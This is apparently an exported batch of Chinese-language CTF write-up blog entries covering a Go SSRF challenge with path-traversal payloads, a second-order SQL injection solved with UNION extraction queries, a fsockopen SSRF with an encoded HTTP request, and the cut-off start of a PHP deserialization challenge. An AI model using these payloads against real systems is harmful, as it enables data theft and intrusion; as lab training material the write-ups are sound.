punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>files <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>l<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Readdir</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> l <span class="token punctuation">{</span>files <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> i<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"files"</span><span class="token punctuation">:</span> files<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"content-disposition"</span><span class="token punctuation">,</span> <span class="token string">`attachment; filename=`</span><span class="token operator">+</span>fi<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">Data</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">uploadController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> file File<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>dir <span class="token operator">:=</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>e <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Mkdir</span><span class="token punctuation">(</span><span class="token string">"./files/"</span><span class="token operator">+</span>dir<span class="token punctuation">,</span> os<span class="token punctuation">.</span>ModePerm<span class="token punctuation">)</span><span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./files"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token keyword">if</span> e <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> e<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span>filename <span class="token operator">:=</span> <span class="token function">md5sum</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Content<span class="token punctuation">)</span>path <span class="token operator">:=</span> <span class="token string">"./files/"</span> <span class="token operator">+</span> dir <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> filenameerr <span class="token operator">=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>Content<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>ModePerm<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"file upload succ, path: "</span> <span class="token operator">+</span> dir <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> filename<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">vulController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> url Url<span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"url msg"</span><span class="token punctuation">:</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>Url<span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:1234/"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> <span class="token string">"url forbidden"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>client <span class="token operator">:=</span> <span class="token operator">&amp;</span>http<span class="token punctuation">.</span>Client<span class="token punctuation">{</span>Timeout<span class="token punctuation">:</span> <span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">}</span>resp<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>Url<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> buffer <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token builtin">byte</span>result <span class="token operator">:=</span> bytes<span class="token punctuation">.</span><span class="token function">NewBuffer</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token punctuation">{</span>n<span class="token punctuation">,</span> err <span class="token operator">:=</span> resp<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>result<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span> result<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>fileMidderware<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/vul"</span><span class="token punctuation">,</span> vulController<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">,</span> uploadController<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"pong"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token boolean">_</span> <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":1234"</span><span class="token punctuation">)</span> <span class="token comment">// listen and serve on 0.0.0.0:8080</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计中间件</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> fi<span class="token punctuation">.</span><span class="token function">IsDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>files <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>l<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Readdir</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> l <span class="token punctuation">{</span>files <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> i<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span><span class="token string">"files"</span><span class="token punctuation">:</span> files<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当判断用户输入的路径为一个文件路径时会进入 if 当中，如果此时请求不是以 / 为结尾，则会加上 / 后进行重定向</p><p><strong>fileSystem.Open 的绕过</strong></p><p>要触发SSRF，首先要使 fileSystem.Open(path) 正确返回一个文件夹，fileSystem.Open 支持相对路径，可以用 ../ 绕过，在讲绕过方法前，我们先看一下文件路径解析的几种情况（可以体会一下和url解析的差异）：</p><p>/../：返回上一层<br>/flag/：flag文件夹<br>/flag&amp;../：一个名为flag&amp;..的路径<br>/127.0.0.1:1234/：一个名为127.0.0.1:1234的路径</p><p>理解了这四种解析，就可以很容易的理解这道题的绕过方法了</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">{"url":"http://127.0.0.1:1234//127.0.0.1/?file=/flag&amp;/../../../.."}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>后端接收到的数据为</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">//127.0.0.1/?file=/flag&amp;/../../../..<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件打开后的路径为</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">//127.0.0.1/?file=/flag&amp;/../../../.. =&gt; //127.0.0.1/?file=/../../.. =&gt; //127.0.0.1/../.. =&gt; //.. =&gt; /<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个显然是个路径</p><p><strong>fi.IsDir()的绕过</strong></p><p>// 就是省略HTTP协议的写法。</p><p>构造 payload</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[GET]/vul[POST]{"url":"http://127.0.0.1:1234//127.0.0.1/?file=/flag&amp;/../../../.."}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用 vps</p><p><img src="/../../../../pic/Pasted%20image%2020221023143015.png"></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">[GET]/vul[POST]{"url":"http://127.0.0.1:1234//vps:port/.."}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JMCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>October 2019</title>
      <link href="/2023/01/21/catchtheflag/games/october/october-2019/"/>
      <url>/2023/01/21/catchtheflag/games/october/october-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="October-2019"><a href="#October-2019" class="headerlink" title="October 2019"></a>October 2019</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Twice-SQL-Injection"><a href="#1-Twice-SQL-Injection" class="headerlink" title="1. Twice SQL Injection"></a>1. Twice SQL Injection</h3><p>#SQL注入 #二次注入</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>进去之后只有两个功能点，登录以及注册</p><p>注册个测试用户 test / test 登录进去</p><p><img src="/../../../../pic/Pasted%20image%2020230305195038.png"></p><p>登录之后是一个显示信息的页面</p><p>随便输入点信息发现被显示了出来，当输入单引号与双引号时发现杯转义了</p><p>推测后端 SQL 语句为</p><pre class="line-numbers language-none"><code class="language-none">UPDATE SET info = "xxx" WHERE username = "xxx"SELECT info from table WHERE username = "xxx"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由于被转义了，在 info 处应该不存在 SQL 注入，在 username 处进行测试</p><p>注册用户  admin’ or sleep(3) – qwe / 123456 登录</p><p>发现被成功延时了几秒说明存在 SQL 注入，并且登录后 info 的显示信息与 admin 用户显示信息相同</p><pre class="line-numbers language-none"><code class="language-none">// 查数据库0' union select database() -- qwe// 查表0' union select group_concat(table_name) from information_schema.tables where table_schema=database() -- qwe// 查列0' union select group_concat(column_name) from information_schema.columns where table_name='flag' -- qwe// 查数据0' union select group_concat(flag) from flag -- qwe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> October </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 WEEK2</title>
      <link href="/2023/01/21/catchtheflag/games/hnctf/hnctf-2022-week2/"/>
      <url>/2023/01/21/catchtheflag/games/hnctf/hnctf-2022-week2/</url>
      
        <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2"><a href="#HNCTF-2022-WEEK2" class="headerlink" title="HNCTF 2022 WEEK2"></a>HNCTF 2022 WEEK2</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-ez-ssrf"><a href="#1-ez-ssrf" class="headerlink" title="1. ez_ssrf"></a>1. ez_ssrf</h3><p>#SSRF</p><ul><li>题目描述</li></ul><p>访问 /index.php</p><ul><li>题目解析</li></ul><p>访问 /index.php 获得代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$port</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$error</span><span class="token punctuation">,</span><span class="token variable">$errstr</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 fsockopen 进行 SSRF</p><p>存在 flag.php</p><p>构造 payload</p><pre class="line-numbers language-none"><code class="language-none">[GET]index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo%3d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound Prize</title>
      <link href="/2023/01/21/catchtheflag/games/nssctf/nssround-prize/"/>
      <url>/2023/01/21/catchtheflag/games/nssctf/nssround-prize/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-Prize"><a href="#NSSRound-Prize" class="headerlink" title="NSSRound Prize"></a>NSSRound Prize</h1><h2 id="1-prize-p1"><a href="#1-prize-p1" class="headerlink" title="1. prize_p1"></a>1. prize_p1</h2><p>#PHP反序列化 #phar反序列化 #利用CG机制绕过抛出异常 #phar签名修复</p><ul><li>题目描述</li></ul><p>那么就从这里开始起航吧。</p><ul><li>题目解析</li></ul><p>直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">getflag</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$config</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/get|flag|post|php|filter|base64|rot13|read|data/i'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我知道你想干吗，我的建议是不要那样做。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./tmp/a.txt"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 